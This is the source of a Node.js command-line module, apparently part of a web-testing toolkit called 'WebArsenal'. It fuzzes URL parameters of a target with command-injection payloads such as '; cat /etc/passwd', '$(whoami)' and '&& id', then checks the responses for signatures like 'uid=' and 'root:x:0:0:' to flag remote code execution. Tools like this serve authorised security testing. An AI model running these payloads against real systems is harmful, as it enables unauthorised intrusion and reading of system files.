#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: rce-fuzzer.js                                      ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('rce-fuzzer.js')
  .description('Tests for Remote Code Execution vulnerabilities using common command execution payloads.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters (e.g. https://example.com/api?cmd=test)')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .parse(process.argv);

const opts = program.opts();

const RCE_PAYLOADS = [
  "; id", "| id", "`id`", "$(id)",
  "; whoami", "| whoami", "`whoami`", "$(whoami)",
  "; ping -c 1 127.0.0.1",
  "; cat /etc/passwd",
  "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
  "& whoami", "&& id"
];

const SIGNATURES = [
  "uid=", "gid=", "groups=", // Linux id
  "nt authority\\system", // Windows whoami
  "root:x:0:0:" // cat /etc/passwd
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'rce-fuzzer.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = opts.param ? [opts.param] : Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0) {
    console.log(chalk.yellow('[!] No parameters found. Use -u <url?cmd=test>'));
    return;
  }
  
  for (const param of params) {
    console.log(chalk.cyan(`[*] Fuzzing [RCE] for: ${param}`));
    for (const payload of RCE_PAYLOADS) {
      const testUrl = new URL(targetUrl.href);
      testUrl.searchParams.set(param, payload);
      
      try {
        const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
        const body = String(res.data);
        
        const foundSig = SIGNATURES.find(sig => body.includes(sig));
        
        if (foundSig) {
           console.log(chalk.bold.red(`\n[!] RCE VULNERABILITY DETECTED! [${param}]`));
           console.log(chalk.red(`    Payload: ${payload}`));
           console.log(chalk.red(`    Signature Match: ${foundSig}`));
           console.log(chalk.red(`    URL: ${testUrl.href}\n`));
           break;
        }
      } catch (e) {}
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
